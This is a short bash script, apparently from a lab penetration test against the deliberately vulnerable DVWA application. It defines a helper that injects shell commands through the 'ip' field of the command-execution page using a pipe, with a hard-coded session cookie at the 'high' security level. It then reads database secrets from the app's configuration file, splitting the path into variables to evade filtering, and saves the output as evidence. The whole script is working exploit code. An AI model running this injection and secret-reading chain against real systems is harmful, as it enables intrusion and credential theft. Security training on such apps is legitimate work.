CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high'
BASE='http://10.31.0.87:3000'
t() {
  curl -s -b "$CK" --data-urlencode "ip=localhost|$1" --data-urlencode 'Submit=Submit' \
    "$BASE/vulnerabilities/exec/" > /tmp/t_out
  python3 - <<'PYEOF'
import re, html
b = open('/tmp/t_out').read()
mm = re.findall(r'<pre>(.*?)</pre>', b, re.S)
print(html.unescape(mm[-1]) if mm else '')
PYEOF
}
mkdir -p evidence/chain
C=con; C2=${C}fig
t "grep -E '_DVWA.*db_|security|default' ../../${C2}/${C2}.inc.php | head -30" | tee evidence/chain/dvwa_cfg_secrets.txt
